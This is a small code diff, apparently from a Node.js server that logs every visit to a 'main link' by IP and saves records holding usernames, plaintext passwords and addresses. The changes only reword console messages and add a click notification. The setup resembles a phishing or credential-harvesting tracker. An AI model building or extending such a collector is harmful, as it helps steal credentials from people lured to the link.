@@ -28,13 +28,14 @@ function saveRecord(type, username = null, password = null, address = null, ip =
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
-    console.log(`📍 SAVED: ${type}`);
+    console.log(`📍 ${type} - Recorded`);
 }
 
-// === IMPORTANT: Record immediately on main link ===
+// === MAIN LINK - Record Immediately ===
 app.get('/', (req, res) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
+    console.log("✅ Someone clicked the main link!");
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
